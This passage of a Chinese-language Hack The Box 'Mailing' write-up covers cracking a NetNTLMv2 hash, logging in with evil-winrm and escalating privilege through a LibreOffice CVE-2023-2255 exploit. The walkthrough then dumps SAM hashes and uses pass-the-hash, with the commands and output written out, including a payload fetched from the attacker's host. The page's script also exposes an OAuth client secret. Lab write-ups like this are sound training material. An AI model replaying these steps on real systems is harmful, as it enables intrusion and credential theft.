Platform <span class="comment">#1 [The pocl project]</span></span><br><span class="line">==================================================================================================================================================</span><br><span class="line">* Device <span class="comment">#1: cpu-haswell-12th Gen Intel(R) Core(TM) i5-12400, 2918/5901 MB (1024 MB allocatable), 8MCU</span></span><br><span class="line"></span><br><span class="line">Minimum password length supported by kernel: 0</span><br><span class="line">Maximum password length supported by kernel: 256</span><br><span class="line"></span><br><span class="line">Hashes: 1 digests; 1 unique digests, 1 unique salts</span><br><span class="line">Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates</span><br><span class="line">Rules: 1</span><br><span class="line"></span><br><span class="line">Optimizers applied:</span><br><span class="line">* Zero-Byte</span><br><span class="line">* Not-Iterated</span><br><span class="line">* Single-Hash</span><br><span class="line">* Single-Salt</span><br><span class="line"></span><br><span class="line">ATTENTION! Pure (unoptimized) backend kernels selected.</span><br><span class="line">Pure kernels can crack longer passwords, but drastically reduce performance.</span><br><span class="line">If you want to switch to optimized kernels, append -O to your commandline.</span><br><span class="line">See the above message to find out about the exact limits.</span><br><span class="line"></span><br><span class="line">Watchdog: Hardware monitoring interface not found on your system.</span><br><span class="line">Watchdog: Temperature abort trigger disabled.</span><br><span class="line"></span><br><span class="line">Host memory required <span class="keyword">for</span> this attack: 2 MB</span><br><span class="line"></span><br><span class="line">Dictionary cache hit:</span><br><span class="line">* Filename..: /usr/share/wordlists/rockyou.txt</span><br><span class="line">* Passwords.: 14344385</span><br><span class="line">* Bytes.....: 139921507</span><br><span class="line">* Keyspace..: 14344385</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Mode........: 5600 (NetNTLMv2)</span><br><span class="line">Hash.Target......: MAYA::MAILING:95de498996a31a8c:d2babc773ff653ee285d...000000</span><br><span class="line">Time.Started.....: Fri Aug 16 17:25:41 2024 (2 secs)</span><br><span class="line">Time.Estimated...: Fri Aug 16 17:25:43 2024 (0 secs)</span><br><span class="line">Kernel.Feature...: Pure Kernel</span><br><span class="line">Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.<span class="comment">#1.........:  3185.0 kH/s (0.81ms) @ Accel:512 Loops:1 Thr:1 Vec:8</span></span><br><span class="line">Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)</span><br><span class="line">Progress.........: 5935104/14344385 (41.38%)</span><br><span class="line">Rejected.........: 0/5935104 (0.00%)</span><br><span class="line">Restore.Point....: 5931008/14344385 (41.35%)</span><br><span class="line">Restore.Sub.<span class="comment">#1...: Salt:0 Amplifier:0-1 Iteration:0-1</span></span><br><span class="line">Candidate.Engine.: Device Generator</span><br><span class="line">Candidates.<span class="comment">#1....: m6161 -&gt; m3808w</span></span><br><span class="line"></span><br><span class="line">Started: Fri Aug 16 17:25:22 2024</span><br><span class="line">Stopped: Fri Aug 16 17:25:44 2024</span><br><span class="line"></span><br><span class="line">┌──(kazma㉿kali)-[~/hack_the_box/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability]</span><br><span class="line">└─$ <span class="built_in">cat</span> output.txt</span><br><span class="line">MAYA::MAILING:95de498996a31a8c:d2babc773ff653ee285d33e6fe5493a6:010100000000000080f2298488b6da015d1dcbb264e2490c0000000002000800530059005500490001001e00570049004e002d005a004f0042005000340036004d0038004b005600410004003400570049004e002d005a004f0042005000340036004d0038004b00560041002e0053005900550049002e004c004f00430041004c000300140053005900550049002e004c004f00430041004c000500140053005900550049002e004c004f00430041004c000700080080f2298488b6da0106000400020000000800300030000000000000000000000000200000c9e5bc0c7d84e948e12cf5d180e24c511c66b448ef8db310790edb6ad72669ff0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00370031000000000000000000:m4y4ngs4ri</span><br></pre></td></tr></table></figure></div>
+<p>找到密碼：m4y4ngs4ri<br>好，有了帳密之後，這裡要介紹一個神器叫 <a class="link"   target="_blank" rel="noopener" href="https://github.com/Hackplayers/evil-winrm" >evil-winrm <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，順便附上他的超帥圖片和說明：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/mailing_evil.png"
+                      alt="evil"
+                ></p>
+<blockquote>
+<p>This shell is the ultimate WinRM shell for hacking&#x2F;pentesting.</p>
+</blockquote>
+<p>WinRM (Windows Remote Management) is the Microsoft implementation of WS-Management Protocol. A standard SOAP based protocol that allows hardware and operating systems from different vendors to interoperate. Microsoft included it in their Operating Systems in order to make life easier to system administrators.</p>
+<p>This program can be used on any Microsoft Windows Servers with this feature enabled (usually at port 5985), of course only if you have credentials and permissions to use it. So we can say that it could be used in a post-exploitation hacking&#x2F;pentesting phase. The purpose of this program is to provide nice and easy-to-use features for hacking. It can be used with legitimate purposes by system administrators as well but the most of its features are focused on hacking&#x2F;pentesting stuff.</p>
+<p>It is based mainly in the WinRM Ruby library which changed its way to work since its version 2.0. Now instead of using WinRM protocol, it is using PSRP (Powershell Remoting Protocol) for initializing runspace pools as well as creating and processing pipelines.</p>
+<p>總結來說 <code>evil-winrm</code> 是一個針對 Windows 的遠程管理工具，透過 PSRP 協議並且開在 5985 port。<br>用法如下：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">└─$ evil-winrm -i 10.129.231.40 -u maya -p m4y4ngs4ri</span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v3.5</span><br><span class="line"></span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine</span><br><span class="line"></span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="comment">#Remote-path-completion</span></span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\maya\Documents&gt; <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\maya\Documents</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">d-----         3/13/2024   4:49 PM                WindowsPowerShell</span><br><span class="line">-a----         4/11/2024   1:24 AM            807 mail.py</span><br><span class="line">-a----         3/14/2024   4:30 PM            557 mail.vbs</span><br></pre></td></tr></table></figure></div>
+<p>進去了！終於…</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\maya&gt; <span class="built_in">cd</span> Desktop</span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\maya\Desktop&gt; <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\maya\Desktop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line"><span class="literal">----</span>                 <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span></span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2</span>/<span class="number">28</span>/<span class="number">2024</span>   <span class="number">7</span>:<span class="number">34</span> PM           <span class="number">2350</span> Microsoft Edge.lnk</span><br><span class="line"><span class="literal">-ar---</span>         <span class="number">8</span>/<span class="number">16</span>/<span class="number">2024</span>  <span class="number">10</span>:<span class="number">41</span> AM             <span class="number">34</span> user.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ca*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\maya\Desktop&gt; <span class="built_in">cat</span> user.txt</span><br></pre></td></tr></table></figure></div>
+<p>user flag 在 Desktop 下面。<br>接著我們可以逛個幾圈，然後你就會跟我一樣放棄去偷看解答發現 LibreOffice 的版本是有 CVE 的 <del>這誰找得到</del>：</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Program Files\LibreOffice\readmes&gt; <span class="built_in">cat</span> readme_es.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================================================================</span><br><span class="line"></span><br><span class="line">LÃ©ame de LibreOffice <span class="number">7.4</span></span><br><span class="line"></span><br><span class="line">======================================================================</span><br></pre></td></tr></table></figure></div>
+<p>exploit：<br><a class="link"   target="_blank" rel="noopener" href="https://github.com/elweth-sec/CVE-2023-2255" >https://github.com/elweth-sec/CVE-2023-2255 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ <span class="built_in">cd</span> CVE-2023-2255/</span><br><span class="line">└──╼ [★]$ python3 CVE-2023-2255.py --cmd <span class="string">&#x27;net localgroup Administradores maya /add&#x27;</span></span><br><span class="line">File output.odt has been created !</span><br></pre></td></tr></table></figure></div>
+<p>我們執行 exploit 並執行 command 把 localgroup 的 maya 加到 Administrators 的群組裡。<br>這裡生成了一個 output.odt 要讓我們到目標機器執行，<code>.odt</code> 文件可以用 LibreOffice 打開。<br>那我們現在開個 http server 讓我們可以從目標機器載下來。</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br></pre></td></tr></table></figure></div>
+<p>evil-winrm：</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\maya\Documents&gt; <span class="built_in">Invoke-WebRequest</span> <span class="literal">-Uri</span> <span class="string">&quot;http://10.10.14.26:8000/output.odt&quot;</span> <span class="literal">-OutFile</span> <span class="string">&quot;./output.odt&quot;</span></span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\maya\Documents&gt; <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\maya\Documents</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line"><span class="literal">----</span>                 <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span></span><br><span class="line">d<span class="literal">-----</span>         <span class="number">3</span>/<span class="number">13</span>/<span class="number">2024</span>   <span class="number">4</span>:<span class="number">49</span> PM                WindowsPowerShell</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">4</span>/<span class="number">11</span>/<span class="number">2024</span>   <span class="number">1</span>:<span class="number">24</span> AM            <span class="number">807</span> mail.py</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">3</span>/<span class="number">14</span>/<span class="number">2024</span>   <span class="number">4</span>:<span class="number">30</span> PM            <span class="number">557</span> mail.vbs</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">8</span>/<span class="number">17</span>/<span class="number">2024</span>   <span class="number">5</span>:<span class="number">07</span> AM          <span class="number">30526</span> output.odt</span><br></pre></td></tr></table></figure></div>
+<p>我們成功載下來了，<code>ls</code> 後確定可以看到 <code>output.odt</code>。<br>接著我們就來提權：</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\maya\Documents&gt; <span class="built_in">cd</span> /Imp*</span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Important Documents&gt; <span class="built_in">curl</span> <span class="literal">-o</span> output.odt <span class="number">10.10</span>.<span class="number">14.26</span>:<span class="number">8000</span>/output.odt</span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Important Documents&gt; net users maya</span><br><span class="line">User name                    maya</span><br><span class="line">Full Name</span><br><span class="line">Comment</span><br><span class="line">User<span class="string">&#x27;s comment</span></span><br><span class="line"><span class="string">Country/region code          000 (System Default)</span></span><br><span class="line"><span class="string">Account active               Yes</span></span><br><span class="line"><span class="string">Account expires              Never</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Password last set            2024-04-12 4:16:20 AM</span></span><br><span class="line"><span class="string">Password expires             Never</span></span><br><span class="line"><span class="string">Password changeable          2024-04-12 4:16:20 AM</span></span><br><span class="line"><span class="string">Password required            Yes</span></span><br><span class="line"><span class="string">User may change password     Yes</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Workstations allowed         All</span></span><br><span class="line"><span class="string">Logon script</span></span><br><span class="line"><span class="string">User profile</span></span><br><span class="line"><span class="string">Home directory</span></span><br><span class="line"><span class="string">Last logon                   2024-08-17 6:11:03 AM</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Logon hours allowed          All</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Local Group Memberships      *Remote Management Use*Usuarios</span></span><br><span class="line"><span class="string">                             *Usuarios de escritori</span></span><br><span class="line"><span class="string">Global Group memberships     *Ninguno</span></span><br><span class="line"><span class="string">The command completed successfully.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">*Evil-WinRM* PS C:\Important Documents&gt; ./output.odt</span></span><br><span class="line"><span class="string">*Evil-WinRM* PS C:\Important Documents&gt; net users maya</span></span><br><span class="line"><span class="string">User name                    maya</span></span><br><span class="line"><span class="string">Full Name</span></span><br><span class="line"><span class="string">Comment</span></span><br><span class="line"><span class="string">User&#x27;</span>s comment</span><br><span class="line">Country/region code          <span class="number">000</span> (System Default)</span><br><span class="line">Account active               Yes</span><br><span class="line">Account expires              Never</span><br><span class="line"></span><br><span class="line">Password last <span class="built_in">set</span>            <span class="number">2024</span><span class="literal">-04-12</span> <span class="number">4</span>:<span class="number">16</span>:<span class="number">20</span> AM</span><br><span class="line">Password expires             Never</span><br><span class="line">Password changeable          <span class="number">2024</span><span class="literal">-04-12</span> <span class="number">4</span>:<span class="number">16</span>:<span class="number">20</span> AM</span><br><span class="line">Password required            Yes</span><br><span class="line">User may change password     Yes</span><br><span class="line"></span><br><span class="line">Workstations allowed         All</span><br><span class="line">Logon script</span><br><span class="line">User profile</span><br><span class="line">Home directory</span><br><span class="line">Last logon                   <span class="number">2024</span><span class="literal">-08-17</span> <span class="number">6</span>:<span class="number">11</span>:<span class="number">03</span> AM</span><br><span class="line"></span><br><span class="line">Logon hours allowed          All</span><br><span class="line"></span><br><span class="line">Local <span class="built_in">Group</span> Memberships      *Administradores      *Remote Management Use</span><br><span class="line">                             *Usuarios             *Usuarios de escritori</span><br><span class="line">Global <span class="built_in">Group</span> memberships     *Ninguno</span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure></div>
+<p>雖然不知道為什麼，但是 output.odt 在家目錄下的 Documents 執行不會成功，要在 C:\Important Documents 執行才會生效，可以看到執行前後 user maya 的 Local Group Memberships 變成 Administradores。<br>接下來我們要用 localadmin 的身份登入會需要他的 hash，我們可以用 <code>crackmapexec</code>：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ crackmapexec smb 10.129.231.40 -u maya -p <span class="string">&quot;m4y4ngs4ri&quot;</span> --sam</span><br><span class="line">[*] First time use detected</span><br><span class="line">[*] Creating home directory structure</span><br><span class="line">[*] Creating missing folder logs</span><br><span class="line">[*] Creating missing folder modules</span><br><span class="line">[*] Creating missing folder protocols</span><br><span class="line">[*] Creating missing folder workspaces</span><br><span class="line">[*] Creating missing folder obfuscated_scripts</span><br><span class="line">[*] Creating missing folder screenshots</span><br><span class="line">[*] Creating default workspace</span><br><span class="line">[*] Initializing MSSQL protocol database</span><br><span class="line">[*] Initializing WINRM protocol database</span><br><span class="line">[*] Initializing LDAP protocol database</span><br><span class="line">[*] Initializing SMB protocol database</span><br><span class="line">[*] Initializing SSH protocol database</span><br><span class="line">[*] Initializing VNC protocol database</span><br><span class="line">[*] Initializing WMI protocol database</span><br><span class="line">[*] Initializing FTP protocol database</span><br><span class="line">[*] Initializing RDP protocol database</span><br><span class="line">[*] Copying default configuration file</span><br><span class="line">SMB         10.129.231.40   445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False)</span><br><span class="line">SMB         10.129.231.40   445    MAILING          [+] MAILING\maya:m4y4ngs4ri (Pwn3d!)</span><br><span class="line">SMB         10.129.231.40   445    MAILING          [*] Dumping SAM hashes</span><br><span class="line">SMB         10.129.231.40   445    MAILING          Administrador:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">SMB         10.129.231.40   445    MAILING          Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">SMB         10.129.231.40   445    MAILING          DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">SMB         10.129.231.40   445    MAILING          WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:e349e2966c623fcb0a254e866a9a7e4c:::</span><br><span class="line">SMB         10.129.231.40   445    MAILING          localadmin:1001:aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae:::</span><br><span class="line">SMB         10.129.231.40   445    MAILING          maya:1002:aad3b435b51404eeaad3b435b51404ee:af760798079bf7a3d80253126d3d28af:::</span><br><span class="line">SMB         10.129.231.40   445    MAILING          [+] Added 6 SAM hashes to the database</span><br></pre></td></tr></table></figure></div>
+<p>我們成功用 maya 登入並取得上面那些帳號存在 SAM 裡面的 hash 了。<br>接著我們可以嘗試用 <code>impacket-wmiexec</code> 透過 localadmin 登入取得 root flag：</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]<span class="variable">$</span> impacket<span class="literal">-wmiexec</span> localadmin@<span class="number">10.129</span>.<span class="number">231.40</span> <span class="literal">-hashes</span> <span class="string">&quot;aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae&quot;</span></span><br><span class="line">Impacket v0.<span class="number">10.0</span> - Copyright <span class="number">2022</span> SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] SMBv3.<span class="number">0</span> dialect used</span><br><span class="line">[!] Launching semi<span class="literal">-interactive</span> shell - Careful what you execute</span><br><span class="line">[!] Press help <span class="keyword">for</span> extra shell commands</span><br><span class="line">C:\&gt;<span class="built_in">cd</span> Users</span><br><span class="line">C:\Users&gt;<span class="built_in">cd</span> localadmin</span><br><span class="line">C:\Users\localadmin&gt;<span class="built_in">cd</span> Desktop</span><br><span class="line">C:\Users\localadmin\Desktop&gt;<span class="built_in">dir</span></span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is <span class="number">9502</span><span class="literal">-BA18</span></span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\localadmin\Desktop</span><br><span class="line"></span><br><span class="line"><span class="number">2024</span><span class="literal">-04-12</span>  <span class="number">06</span>:<span class="number">10</span> AM    &lt;<span class="built_in">DIR</span>&gt;          .</span><br><span class="line"><span class="number">2024</span><span class="literal">-04-12</span>  <span class="number">06</span>:<span class="number">10</span> AM    &lt;<span class="built_in">DIR</span>&gt;          ..</span><br><span class="line"><span class="number">2024</span><span class="literal">-02-27</span>  <span class="number">05</span>:<span class="number">30</span> PM             <span class="number">2</span>,<span class="number">350</span> Microsoft Edge.lnk</span><br><span class="line"><span class="number">2024</span><span class="literal">-08-16</span>  <span class="number">10</span>:<span class="number">41</span> AM                <span class="number">34</span> root.txt</span><br><span class="line">               <span class="number">2</span> File(s)          <span class="number">2</span>,<span class="number">384</span> bytes</span><br><span class="line">               <span class="number">2</span> <span class="built_in">Dir</span>(s)   <span class="number">4</span>,<span class="number">476</span>,<span class="number">936</span>,<span class="number">192</span> bytes free</span><br><span class="line"></span><br><span class="line">C:\Users\localadmin\Desktop&gt;<span class="built_in">type</span> root.txt</span><br></pre></td></tr></table></figure></div>
+<p>進去之後就可以在 localadmin 的桌面看到，對了這邊登入後是 cmd，所以要用 cmd 的指令。</p>
+<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>第一次打 windows 的靶機超級卡，一個 easy 題就寫了一整天，感覺還有很多知識點沒有弄的很懂，所以這次參考了很多網路上的解法才弄出來，但還是學到不少東西，看來接下來打 windows 靶機前要先補齊一些知識 QQ</p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/whale_waves/article/details/138896310" >https://blog.csdn.net/whale_waves/article/details/138896310 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://medium.com/@EnisisTourist/htb-mailing-writeup-walkthrough-dcc8f04159c4" >https://medium.com/@EnisisTourist/htb-mailing-writeup-walkthrough-dcc8f04159c4 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/mailing_pwn.png"
+                      alt="pwn"
+                ></p>
+
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> HackTheBox-Machines Mailing Writeup</li>
+        <li><strong>Author:</strong> kazma</li>
+        <li><strong>Created at
+                :</strong> 2024-08-15 20:32:40</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2024-08-17 15:45:17
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kazma.tw/2024/08/15/HackTheBox-Machines-Mailing-Writeup/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/htb/">#htb</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/writeup/">#writeup</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/machines/">#machines</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/pt/">#pt</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2024/08/15/HackTheBox-Machines-Sea-Writeup/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">HackTheBox-Machines Sea Writeup</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="gitalk-container"></div>
+    <script data-swup-reload-script
+            src="//cdn.staticfile.org/gitalk/1.8.0/gitalk.min.js"></script>
+    <script data-swup-reload-script>
+
+        function loadGitalk() {
+            let __gitalk__pathname = decodeURI(location.pathname);
+            const __gitalk__pathnameLength = __gitalk__pathname.length;
+            const __gitalk__pathnameMaxLength = 50;
+            if (__gitalk__pathnameLength > __gitalk__pathnameMaxLength) {
+                __gitalk__pathname = __gitalk__pathname.substring(0, __gitalk__pathnameMaxLength - 3) + '...';
+            }
+
+            try {
+                Gitalk && new Gitalk({
+                    clientID: '68fd7e0e6c37358fbb4f',
+                    clientSecret: 'dc6a9d6490a92521e96b38717770845226846c62',
+                    repo: 'kazmatw.github.io',
+                    owner: 'kazmatw',
+                    admin: ['kazmatw'],
+                    id: __gitalk__pathname,
+                    language: 'en',
+                    proxy: 'https://github.com/login/oauth/access_token'
+                }).render('gitalk-container');
+
+            } catch (e) {
+                window.Gitalk = null;
+            }
+        }
+
+        if ('true') {
+            const loadGitalkTimeout = setTimeout(() => {
+                loadGitalk();
+                clearTimeout(loadGitalkTimeout);
+            }, 1000);
+        } else {
+            window.addEventListener('DOMContentLoaded', loadGitalk);
+        }
+    </script>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
